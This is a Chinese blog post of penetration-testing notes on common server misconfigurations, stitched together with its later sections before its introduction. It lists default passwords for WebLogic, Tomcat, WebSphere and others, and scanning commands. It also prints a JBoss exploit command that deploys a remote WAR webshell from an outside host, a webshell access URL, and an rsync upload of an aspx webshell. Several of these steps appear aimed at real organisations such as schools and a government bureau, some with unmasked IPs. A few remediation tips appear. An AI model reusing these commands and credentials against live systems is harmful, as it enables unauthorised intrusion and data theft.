+<p>curl <a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-0121861">http://www.wooyun.org/bugs/wooyun-2010-0121861</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ce74e6ffdf131681.png"></p>
+<p>查看系统名称：</p>
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSName</p>
+<p>Windows 2003</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_228e2132d6117e7e.png"></p>
+<p>查看系统版本</p>
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSVersion</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_520647a32422e3a2.png"></p>
+<p>远程部署war包（失败）</p>
+<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a target="_blank" rel="noopener" href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> invoke jboss.system:service=MainDeployer deploy<br><a target="_blank" rel="noopener" href="http://p2j.cn/is.war">http://p2j.cn/is.war</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_f6f6157ae371b472.png"></p>
+<p><a target="_blank" rel="noopener" href="http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&cmd=ls">http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;cmd=ls</a><br>访问shell是失败</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_9f1eec4d60316f17.png"></p>
+<h1 id="25-测试机外网可访问"><a href="#25-测试机外网可访问" class="headerlink" title="25 测试机外网可访问 "></a>25 测试机外网可访问 </h1><p>测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..<br>此部分不好做归纳，故略过。</p>
+<h1 id="26-padding-oracle-attack"><a href="#26-padding-oracle-attack" class="headerlink" title="26 padding oracle attack "></a>26 padding oracle attack </h1><h2 id="26-1-基础知识"><a href="#26-1-基础知识" class="headerlink" title="26.1 基础知识 "></a>26.1 基础知识 </h2><p>Padding指数据“填充”</p>
+<p>对于<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/155969.htm">加密算法</a>来说，它们是基于等长的“<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/702806.htm">数据块</a>”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/60408.htm)%EF%BC%8C%E8%80%8C%E5%AF%B9%E4%BA%8ERijndael%E7%AE%97%E6%B3%95%E6%9D%A5%E8%AF%B4%E5%88%99%E6%98%AF16%E3%80%8124%E6%88%9632%E5%AD%97%E8%8A%82%EF%BC%89%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9A%84%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E9%95%BF%E5%BA%A6%E6%98%AF%E4%B8%8D%E8%A7%84%E5%88%99%E7%9A%84%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%BF%85%E7%84%B6%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E2%80%9C%E5%A1%AB%E5%85%85(http://baike.baidu.com/view/542735.htm)%E2%80%9D%E6%89%8D%E8%83%BD%E5%BD%A2%E6%88%90%E5%AE%8C%E6%95%B4%E7%9A%84%E2%80%9C%E5%9D%97%E2%80%9D%E3%80%82%E2%80%9C%E5%A1%AB%E5%85%85%E2%80%9D%E6%97%B6%E6%AF%94%E8%BE%83%E5%B8%B8%E7%94%A8%E7%9A%84%E6%98%AFPKCS">http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS</a><br>#5规则，简单地说，便是根据最后一个数据块(<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/702806.htm)%E6%89%80%E7%BC%BA%E5%B0%91%E7%9A%84%E9%95%BF%E5%BA%A6%E6%9D%A5%E9%80%89%E6%8B%A9%E5%A1%AB%E5%85%85%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82">http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。</a></p>
+<h2 id="26-2-漏洞利用"><a href="#26-2-漏洞利用" class="headerlink" title="26.2 漏洞利用 "></a>26.2 漏洞利用 </h2><p>略过，乌云上有案例。</p>
+<h1 id="27-tomcat弱口令"><a href="#27-tomcat弱口令" class="headerlink" title="27 tomcat弱口令 "></a>27 tomcat弱口令 </h1><h2 id="27-1-基础知识"><a href="#27-1-基础知识" class="headerlink" title="27.1 基础知识 "></a>27.1 基础知识 </h2><p>不再提及。</p>
+<h2 id="27-2-漏洞利用"><a href="#27-2-漏洞利用" class="headerlink" title="27.2 漏洞利用 "></a>27.2 漏洞利用 </h2><p>弱密码：</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxxx.com:8080/manager/html">http://www.xxxx.com:8080/manager/html</a> tomcat:tomcat</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxxx.com:8080/manager/html">http://www.xxxx.com:8080/manager/html</a> admin:admin</p>
+<h1 id="28-phpmyadmin弱口令"><a href="#28-phpmyadmin弱口令" class="headerlink" title="28 phpmyadmin弱口令 "></a>28 phpmyadmin弱口令 </h1><p>略</p>
+<h1 id="29-MongoDB配置不当"><a href="#29-MongoDB配置不当" class="headerlink" title="29 MongoDB配置不当 "></a>29 MongoDB配置不当 </h1><p>drops.wooyun.org/papers/850</p>
+<h2 id="29-1-基本介绍"><a href="#29-1-基本介绍" class="headerlink" title="29.1 基本介绍 "></a>29.1 基本介绍 </h2><p>略</p>
+<h2 id="29-2-未授权访问"><a href="#29-2-未授权访问" class="headerlink" title="29.2 未授权访问 "></a>29.2 未授权访问 </h2><p>默认数据库 admin</p>
+<p>用户密码和密码均为空</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_af31540eed427f60.png"></p>
+<h2 id="29-3-实战演练"><a href="#29-3-实战演练" class="headerlink" title="29.3 实战演练 "></a>29.3 实战演练 </h2><p>yy.yy.yy.yy:27017<br>博苑家_幼儿园教育信息化平台</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_933d6e56d127adb.png"></p>
+<h1 id="30-各种敏感后台对外开放"><a href="#30-各种敏感后台对外开放" class="headerlink" title="30 各种敏感后台对外开放 "></a>30 各种敏感后台对外开放 </h1><p>一般“奇葩”端口web访问可见。</p>
+<h1 id="31-Django配置不当致信息泄露"><a href="#31-Django配置不当致信息泄露" class="headerlink" title="31 Django配置不当致信息泄露 "></a>31 Django配置不当致信息泄露 </h1><p>Django设置debug = True<br>，将报错信息返回至浏览页面，从而导致信息泄露</p>
+<h1 id="32-Redis未授权访问"><a href="#32-Redis未授权访问" class="headerlink" title="32 Redis未授权访问 "></a>32 Redis未授权访问 </h1><p>Port: 6379</p>
+<p>一般不需要认证，可直接访问</p>
+<h2 id="32-1-基础知识"><a href="#32-1-基础知识" class="headerlink" title="32.1 基础知识 "></a>32.1 基础知识 </h2><p>Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。</p>
+<p>和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。</p>
+<p>其中RDB就像数据库备份文件</p>
+<p>AOF则是一个log日志文件</p>
+<h2 id="32-2-利用方式"><a href="#32-2-利用方式" class="headerlink" title="32.2 利用方式 "></a>32.2 利用方式 </h2><ul>
+<li>Kali下：</li>
+</ul>
+<p>redis-cli -h xx.com</p>
+<ul>
+<li><p>使用软件： Redis Desktop Manager</p>
+</li>
+<li><p>利用redis未授权访问漏洞getshell【<a target="_blank" rel="noopener" href="http://www.secpulse.com/archives/5357.html%E3%80%91">www.secpulse.com/archives/5357.html】</a></p>
+<ul>
+<li><p>开启web服务</p>
+</li>
+<li><p>网站物理路径</p>
+</li>
+<li><p>www目录可写（root权限）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="32-3-实战演练"><a href="#32-3-实战演练" class="headerlink" title="32.3 实战演练 "></a>32.3 实战演练 </h2><p>xx科技有限公司</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_83a0c3790ea4b0cf.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_f0a10558018436fa.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_29c9a47e91a7ef0a.png"></p>
+<h1 id="33-LDAP未授权访问"><a href="#33-LDAP未授权访问" class="headerlink" title="33 LDAP未授权访问 "></a>33 LDAP未授权访问 </h1><p>Port: 389<br>WooYun-2015-92789(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2015-092789">http://www.wooyun.org/bugs/wooyun-2015-092789</a>)</p>
+<h2 id="33-1-基础知识"><a href="#33-1-基础知识" class="headerlink" title="33.1 基础知识 "></a>33.1 基础知识 </h2><p>Lightweight Directory Access<br>Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p>
+<h2 id="33-2-利用方式"><a href="#33-2-利用方式" class="headerlink" title="33.2 利用方式 "></a>33.2 利用方式 </h2><p>使用LDAP Admin进行登陆</p>
+<h2 id="33-3-应用实例"><a href="#33-3-应用实例" class="headerlink" title="33.3 应用实例 "></a>33.3 应用实例 </h2><p>zz.zz.zz.zz</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_63de4b8b96d21dcd.png"></p>
+<h1 id="34-SMB弱口令"><a href="#34-SMB弱口令" class="headerlink" title="34 SMB弱口令 "></a>34 SMB弱口令 </h1><p>Port: 445</p>
+<h2 id="34-1-smb字典"><a href="#34-1-smb字典" class="headerlink" title="34.1 smb字典 "></a>34.1 smb字典 </h2><h2 id="34-2-MS08-067溢出"><a href="#34-2-MS08-067溢出" class="headerlink" title="34.2 MS08-067溢出 "></a>34.2 MS08-067溢出 </h2><p><a target="_blank" rel="noopener" href="http://www.2cto.com/Article/201308/237265.html">http://www.2cto.com/Article/201308/237265.html</a></p>
+<p>Windows Server<br>服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft<br>Windows 2000 、Windows XP 、Windows<br>Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。</p>
+<p>Nmap 可以检测目标上是否存在该漏洞：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp –sS –A –script=smb-check-vulns –PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br><span class="line"></span><br><span class="line">nmap -sS -A --script=smb-check-vulns -PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span>.zz</span><br></pre></td></tr></table></figure>
+<p>…….</p>
+<h1 id="35-openssl心脏出血"><a href="#35-openssl心脏出血" class="headerlink" title="35 openssl心脏出血 "></a>35 openssl心脏出血 </h1><p>Port：443</p>
+<p>Kali桌面以保存python验证脚本</p>
+<p>root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz</p>
+<h1 id="36-squid代理默认端口"><a href="#36-squid代理默认端口" class="headerlink" title="36 squid代理默认端口 "></a>36 squid代理默认端口 </h1><p>Port: 3128</p>
+<p>若没有设置口令，则很可能直接漫游内网。</p>
+<h1 id="37-GlassFish-web中间件弱口令"><a href="#37-GlassFish-web中间件弱口令" class="headerlink" title="37 GlassFish web中间件弱口令 "></a>37 GlassFish web中间件弱口令 </h1><p>Port: 4848</p>
+<p>弱口令：admin / adminadmin</p>
+<h1 id="38-PHP-FastCGI远程利用"><a href="#38-PHP-FastCGI远程利用" class="headerlink" title="38 PHP FastCGI远程利用 "></a>38 PHP FastCGI远程利用 </h1><p>Port：9000</p>
+<p>zone.wooyun.org/content/1060</p>
+<p>使用nmap进行指纹识别： <code>nmap –sV –p 9000 –open zz.zz.zz.zz/24</code></p>
+<p>目前遇到poc执行出现问题：invalid header<br>version</p>
+<p>（windows 7下未安装goland，<br>kali中已安装仍然出现该问题）</p>
+<h1 id="39-elasticsearch代码执行"><a href="#39-elasticsearch代码执行" class="headerlink" title="39 elasticsearch代码执行 "></a>39 elasticsearch代码执行 </h1><p>Port: 9200</p>
+<h1 id="40-websphere-web中间件弱口令"><a href="#40-websphere-web中间件弱口令" class="headerlink" title="40 websphere web中间件弱口令 "></a>40 websphere web中间件弱口令 </h1><p>Port: 9043</p>
+<p>弱口令：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">admin</span> / <span class="keyword">admin</span></span><br><span class="line"></span><br><span class="line">websphere / websphere</span><br><span class="line"></span><br><span class="line"><span class="keyword">system</span> / manager</span><br></pre></td></tr></table></figure>
+
+<h1 id="41-zebra路由弱密码"><a href="#41-zebra路由弱密码" class="headerlink" title="41 zebra路由弱密码 "></a>41 zebra路由弱密码 </h1><p>Port: 2601,2604</p>
+<p>zebra / zebra</p>
+<h1 id="42-rundeck-web"><a href="#42-rundeck-web" class="headerlink" title="42 rundeck web "></a>42 rundeck web </h1><p>Port：4440 wooyun-2015-092026</p>
+<p>runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。</p>
+<p><a target="_blank" rel="noopener" href="http://ip:4440/">http://IP:4440</a> admin / admin</p>
+<p><a target="_blank" rel="noopener" href="http://ip:4440/menu/home">http://IP:4440/menu/home</a></p>
+<h1 id="43-dns未设置spf导致邮箱欺骗漏洞"><a href="#43-dns未设置spf导致邮箱欺骗漏洞" class="headerlink" title="43 dns未设置spf导致邮箱欺骗漏洞 "></a>43 dns未设置spf导致邮箱欺骗漏洞 </h1><p>nslookup –qt=mx baidu.com</p>
+<p>nslookup –qt=txt baidu.com</p>
+<h1 id="44-CVS源码泄露"><a href="#44-CVS源码泄露" class="headerlink" title="44 CVS源码泄露 "></a>44 CVS源码泄露 </h1><h2 id="44-1-基础知识"><a href="#44-1-基础知识" class="headerlink" title="44.1 基础知识 "></a>44.1 基础知识 </h2><p>略</p>
+<h2 id="44-2-实例应用"><a href="#44-2-实例应用" class="headerlink" title="44.2 实例应用 "></a>44.2 实例应用 </h2><p>zz集团</p>
+<p><a target="_blank" rel="noopener" href="http://61.152.242.65/bs3q/CVS/Root">http://yy.yy.yy.yy/bs3q/CVS/Root</a></p>
+<p><a target="_blank" rel="noopener" href="http://61.152.242.65/cmbs/CVS/Root">http://yy.yy.yy.yy/cmbs/CVS/Root</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_9f3274155b1132f6.png"></p>
+<p><a target="_blank" rel="noopener" href="http://61.152.242.65/cmbs/CVS/Entries">http://yy.yy.yy.yy/cmbs/CVS/Entries</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_41469a6a25a8a31a.png"></p>
+<h1 id="45-Tomcat-examples-directory漏洞"><a href="#45-Tomcat-examples-directory漏洞" class="headerlink" title="45 Tomcat examples directory漏洞 "></a>45 Tomcat examples directory漏洞 </h1><p><a target="_blank" rel="noopener" href="http://61.152.242.65/examples/servlets/servlet/SessionExample">http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_3a3e383932a1596a.png"></p>
+<p>是否存在sql post注入<br>、session伪造等安全问题。</p>
+
+        
+<!--
+        </br>
+        <span id="busuanzi_container_page_pv">
+          阅读次数<span id="busuanzi_value_page_pv"></span>
+        </span>
+        <h1 id="0-Readme"><a href="#0-Readme" class="headerlink" title="0 Readme "></a>0 Readme </h1><p>来源于网络，回馈于网络。</p>
+<p>以前简单的记录下学习的笔记，现在轻轻地拿出来与大家分享。</p>
+<p>这份paper没有太多个人思路，但却不失某一漏洞的利用方法及遇到的问题（当时有的没有解决，然而后来也没有继续补充）。</p>
+<p>仅单纯的按照自己的思路，记录和总结常见的运维相关安全漏洞。难免会有错误与不足（包括不全面）之处，还请大家不吝赐教。</p>
+<span id="more"></span>
+
+<h1 id="1-ftp匿名访问或弱口令"><a href="#1-ftp匿名访问或弱口令" class="headerlink" title="1 ftp匿名访问或弱口令 "></a>1 ftp匿名访问或弱口令 </h1><h2 id="1-1-ftp匿名访问"><a href="#1-1-ftp匿名访问" class="headerlink" title="1.1 ftp匿名访问 "></a>1.1 ftp匿名访问 </h2><p>Username = anonymous &amp;&amp; password = (null )</p>
+<p>（1）cmd下，ftp xx.xx.xx.xx</p>
+<p>（2）文件夹，<a href="ftp://xx.xx.xx.xx/">ftp://xx.xx.xx.xx</a></p>
+<h2 id="1-2-ftp常见弱口令"><a href="#1-2-ftp常见弱口令" class="headerlink" title="1.2 ftp常见弱口令 "></a>1.2 ftp常见弱口令 </h2><p>（1）从wooyun的漏洞案例中看来，常见的弱口令：</p>
+<p>网站域名（例如baidu.com） <code>baidu / baidu</code></p>
+<p>（2）从xx项目中（漏扫扫出），弱口令为：</p>
+<p><code>ftp / ftp</code></p>
+<p>（3）网站使用lampp套装，未修改默认ftp密码：</p>
+<p><code>nobody / lampp</code></p>
+<h2 id="1-3-边学边用"><a href="#1-3-边学边用" class="headerlink" title="1.3 边学边用 "></a>1.3 边学边用 </h2><p>xx.xx.xx.xx 匿名访问 ftp / ftp<br>均可以登录</p>
+<p> 使用8uftp登陆：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_3d03e9ebaafe6524.png"></p>
+<p>在文件夹中直接输入地址登陆：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_fc4bacc7b391f84f.png"></p>
+<p>比较两者之间的差异：前者下载文件会受到大小的限制，后者则不会。</p>
+<p>xx.xx.xx.xx yy学校</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_e8776ff5ccdeee62.png"></p>
+<p>xx.xx.xx.xx zz学校</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_158b89f932faeb71.png"></p>
+<h1 id="2-rsync匿名访问"><a href="#2-rsync匿名访问" class="headerlink" title="2 rsync匿名访问 "></a>2 rsync匿名访问 </h1><p>参考： drops.wooyun.org/papers/161</p>
+<p>rsync是一个远程数据同步工具，用 “rsync<br>算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。</p>
+<p>下载文件：</p>
+<p> ./rsync -vzrtopg –progress<br><a href="mailto:&#x2d;&#x2d;&#100;&#x65;&#x6c;&#x65;&#x74;&#x65;&#117;&#115;&#101;&#114;&#x6e;&#97;&#109;&#101;&#x40;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#120;&#x2e;&#120;&#x78;&#120;&#46;&#x78;&#120;&#120;">&#x2d;&#x2d;&#100;&#x65;&#x6c;&#x65;&#x74;&#x65;&#117;&#115;&#101;&#114;&#x6e;&#97;&#109;&#101;&#x40;&#x78;&#120;&#120;&#46;&#x78;&#x78;&#120;&#x2e;&#120;&#x78;&#120;&#46;&#x78;&#120;&#120;</a>::out<br>/home/test/getfile</p>
+<p>上传文件： </p>
+<p>/user/bin/rsync -vzrtopg –progress<br>/home/test/getfile</p>
+<h2 id="2-1-利用方法"><a href="#2-1-利用方法" class="headerlink" title="2.1 利用方法"></a>2.1 利用方法</h2><p>rsync<br>默认端口是873，可使用nmap进行扫描：</p>
+<p>nmap –n –open –p 873 x.x.x.x/24</p>
+<p>尝试上传、下载文件( kali<br>中)：</p>
+<p>rsync 10.210.208.39:: </p>
+<p>或 rsync –vvvv<br>rsync://10.210.208.39::</p>
+<h2 id="2-2-安全配置"><a href="#2-2-安全配置" class="headerlink" title="2.2 安全配置"></a>2.2 安全配置</h2><ul>
+<li><p>限定访问IP：IP<br>Tables防火墙或修改配置文件rsync.conf</p>
+</li>
+<li><p>不允许匿名访问，添加用户口令</p>
+</li>
+</ul>
+<h2 id="2-3-活学活用"><a href="#2-3-活学活用" class="headerlink" title="2.3 活学活用 "></a>2.3 活学活用 </h2><ul>
+<li>xx.xx.xx.xx 连接失败</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_86a6c0dd0ec67cd3.png"></p>
+<ul>
+<li>通信成功，却不知道该如何操作</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d6ea7f3e9ce65313.png"></p>
+<ul>
+<li>可以查看到目录，但是进一步访问需要密码</li>
+</ul>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_93d8b6936279365a.png"></p>
+<p>可以查看到目录，但是禁止进一步访问</p>
+<p>xx窝</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d416cd4216771f91.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.xxx.gov.cn/">http://www.xxx.gov.cn</a> xx局</li>
+</ul>
+<p><code>rsync -v xx.xx.xx.xx::</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_29db8cfd2f6f9255.png"></p>
+<p>上传webshell: # rsync -av /root/Desktop/youxiu.aspx<br>xx.xx.xx.xx::Etest</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7ba40be2f34f1334.png"></p>
+<p>确认是否成功：# rsync -v xx.xx.xx.xx::Etest</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ac23219ff525104.png"></p>
+<p>获取wenshell: <a target="_blank" rel="noopener" href="http://www.xx.cn/youxiu.aspx">http://www.xx.cn/youxiu.aspx</a> admin</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_c97ac1aa5603d31e.png"></p>
+<p>xx.xx.xx.xx yy公司OA系统</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_afd89947e3e3b0f4.png"></p>
+<h1 id="3-DNS域传送漏洞"><a href="#3-DNS域传送漏洞" class="headerlink" title="3 DNS域传送漏洞 "></a>3 DNS域传送漏洞 </h1><p>参考： drops.wooyun.org/papers/64</p>
+<p>DNS主备之间数据同步使用的是dns域传送，如果配置不当，就会导致匿名用户获取DNS服务器某一域的所有记录，将整个企业的基础业务以及网络架构对外暴露从而造成严重的信息泄露，甚至导致企业网络被渗透。</p>
+<h2 id="3-1-漏洞成因"><a href="#3-1-漏洞成因" class="headerlink" title="3.1 漏洞成因 "></a>3.1 漏洞成因 </h2><p>默认安装BIND<br>，配置项中没有allow-transfer项，就会出现dns域传送<br>漏洞</p>
+<p>域传送关键配置项:</p>
+<p>allow-transfer{ipaddress;};<br>通过ip限制可进行域传送的服务器</p>
+<p>allow-transfer{key transfer;};<br>通过key限制可以进行域传送的服务器</p>
+<p>设置方式有两种：</p>
+<ul>
+<li><p>在option配置域</p>
+</li>
+<li><p>在zone配置域</p>
+</li>
+</ul>
+<p>优先级为： zone &gt; option</p>
+<h2 id="3-2-攻击方式"><a href="#3-2-攻击方式" class="headerlink" title="3.2 攻击方式 "></a>3.2 攻击方式 </h2><p>恶意用户可以通过dns域传送获取被攻击域下所有的子域名。导致一些非公开域名（测试域名、内部域名）泄露。而此类域名的安全性相对较低，更容易遭受攻击者的攻击，比如内部测试机往往缺乏必要的安全设置。</p>
+<ul>
+<li>dos下进行测试</li>
+</ul>
+<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ljn&gt;nslookup</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript">set type=ns</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript"><span class="number">12306.</span>cn</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript">server dns1.zdnscloud.biz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span> <span class="javascript">ls <span class="number">12306.</span>cn</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>kali中进行测试</li>
+</ul>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\# <span class="keyword">dig</span> @<span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">12306</span>.<span class="keyword">cn</span> axfr</span><br><span class="line">(<span class="number">1.1</span>.<span class="number">1.1</span>为dns服务器IP，<span class="number">12306</span>.<span class="keyword">cn</span>为测试域名)</span><br><span class="line"></span><br><span class="line">或 \# dnsenum <span class="number">12306</span>.<span class="keyword">cn</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-3-修复方案"><a href="#3-3-修复方案" class="headerlink" title="3.3 修复方案 "></a>3.3 修复方案 </h2><p>只需在限制相应的zone、optio中添加allow-transfer限制可以进行同步的服务器，限制方式有两种:</p>
+<ul>
+<li>限制IP</li>
+<li>使用key认证。</li>
+</ul>
+<h1 id="4-weblogic弱口令"><a href="#4-weblogic弱口令" class="headerlink" title="4 weblogic弱口令 "></a>4 weblogic弱口令 </h1><p>参考： drops.wooyun.org/tips/402</p>
+<h2 id="4-1-基本信息"><a href="#4-1-基本信息" class="headerlink" title="4.1 基本信息 "></a>4.1 基本信息 </h2><p>Weblogic是美国bea公司出品的一个application<br>server（基于javaee架构的中间件），BEA<br>Weblogic用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的java应用服务器。</p>
+<p>很多weblogic服务器安装时采用默认密码，攻击者很容易进入weblogic控制台获取相应权限。</p>
+<p>默认weblogic管理员账号密码： <code>weblogic / weblogic</code></p>
+<p>默认weblogic开放端口： 7001</p>
+<p>默认weblogic访问路径：<br><code>http://xxxx:7001/console</code></p>
+<p>从Default Passwords |<br>CIRT.net获取常见weblogic默认密码：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Oracle-WebLogic：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic <span class="number">11</span>g：weblogic / welcome1 (实践)</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic：<span class="keyword">system</span> / <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">Oracle-Weblogic(<span class="keyword">Version</span>: <span class="number">9.0</span> Beta(Diablo))：weblogic / weblogic</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：<span class="keyword">admin</span> / <span class="keyword">security</span></span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：mary / <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：joe / <span 